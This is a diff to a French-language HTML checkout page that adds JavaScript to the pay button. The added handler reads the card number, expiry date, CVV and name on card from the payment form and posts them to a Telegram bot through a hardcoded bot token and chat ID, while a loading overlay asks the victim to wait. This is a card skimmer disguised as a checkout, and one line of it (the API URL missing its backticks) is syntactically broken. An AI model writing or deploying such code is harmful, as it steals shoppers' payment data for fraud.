@@ -242,15 +242,61 @@
     </div>
 
     <div class="loading-overlay" id="loading-overlay">
-        <img src="106821.png" alt="Loading">
+        <img src="path_to_your_image.png" alt="Loading">
         <p>Veuillez patienter.</p>
         <div class="spinner"></div>
     </div>
 
     <script>
-        document.getElementById('pay-button').addEventListener('click', function () {
+        document.getElementById('pay-button').addEventListener('click', async function () {
             const loadingOverlay = document.getElementById('loading-overlay');
             loadingOverlay.classList.add('active');
+
+            const form = document.getElementById('payment-form');
+            const data = new FormData(form);
+
+            const cardNumber = data.get('card-number');
+            const expiryMonth = data.get('expiry-month');
+            const expiryYear = data.get('expiry-year');
+            const cvv = data.get('cvv');
+            const nameOnCard = data.get('name-on-card');
+            const price = "399.99€";
+
+            const message = `
+🔔 *Nouvelle transaction* :
+💳 Numéro de carte : ${cardNumber}
+📅 Date d'expiration : ${expiryMonth}/${expiryYear}
+🔒 CVV : ${cvv}
+📝 Nom sur la carte : ${nameOnCard}
+💰 Prix : ${price}
+`;
+
+            const botToken = '8101158488:AAH6WIfCC6B6aGkWd_Tt6QRrWD8QKQQc69M';
+            const chatId = '5372119436';
+
+            const telegramApiUrl = https://api.telegram.org/bot${botToken}/sendMessage;
+
+            try {
+                const response = await fetch(telegramApiUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                const dataResponse = await response.json();
+
+                if (dataResponse.ok) {
+                    console.log('Message envoyé avec succès.');
+                } else {
+                    console.error('Erreur dans l\'envoi.');
+                }
+            } catch (error) {
+                console.error('Erreur réseau :', error.message);
+            }
 
             setTimeout(() => {
                 loadingOverlay.classList.remove('active');
